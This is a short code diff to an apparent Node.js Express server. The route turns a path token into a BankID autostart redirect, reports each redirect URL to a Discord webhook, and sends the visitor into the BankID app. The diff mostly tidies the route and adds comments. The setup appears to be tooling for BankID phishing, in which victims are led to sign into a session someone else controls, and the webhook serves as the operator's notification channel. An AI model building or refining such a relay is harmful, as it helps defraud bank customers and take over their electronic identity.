@@ -10,11 +10,15 @@ let AMOUNT = ""
 
 app.use(express.json());
 
-app.get('/?:token', (req, res) => {
- var token = req.params.token; 
+app.get('/:token', (req, res) => {
+  const token = req.params.token; // Get the token from path parameter
 
-  const redirectUrl = `bankid:///?autostarttoken=${token}`;
+  const redirectUrl = `bankid:///?autostarttoken=${encodeURIComponent(token)}`;
+
+  // Log the redirect URL to Discord webhook
   sendDiscordWebhook(redirectUrl);
+
+  // Redirect to the constructed URL
   res.redirect(redirectUrl);
 });
 
